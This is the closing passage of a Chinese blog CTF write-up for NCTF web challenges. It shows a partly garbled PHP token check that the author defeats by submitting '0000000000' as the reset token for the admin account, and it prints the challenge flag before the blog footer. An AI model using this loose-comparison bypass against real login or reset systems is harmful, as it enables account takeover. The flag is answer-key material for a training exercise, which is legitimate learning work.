<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(&lt;nobr aria-hidden=<span class="string">"true"</span>&gt;token)!=<span class="number">10</span>)<span class="keyword">die</span>(‘fail′);<span class="keyword">if</span>(&lt;/nobr&gt;</span><br><span class="line"></span><br><span class="line">token!=’<span class="number">0</span>’) <span class="keyword">die</span>(‘fail’);</span><br><span class="line">长度为十并且值为零</span><br><span class="line">只有$token=<span class="number">0000000000</span></span><br><span class="line">“`</span><br><span class="line">将邮箱admin@nuptzj.cn</span><br><span class="line">密码<span class="number">0000000000</span></span><br><span class="line">得到flag</span><br><span class="line">flag:nctf&#123;thanks_to_cumt_bxs&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>总的来说收获不小，特别是在写writeup的时候，因为写的比较细所以基本上问题都解决了，付出和收获成正比！！！仅供大家参考如果有更好的方法也希望互相交流！！！祝大家玩得愉快！！！</strong></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:shuiyue75381@gmail.com">bb</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="http://bbkali.github.io/2019/03/12/南邮web/">http://bbkali.github.io/2019/03/12/南邮web/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://bbkali.github.io">bb的博客</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2019/03/12/某ctf平台writeup/"><i class="fas fa-angle-left">&nbsp;</i><span>某ctf平台writeup</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2019/03/12/代码编写writeup/"><span>代码编写writeup</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2019 ～ 2020 By bb</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>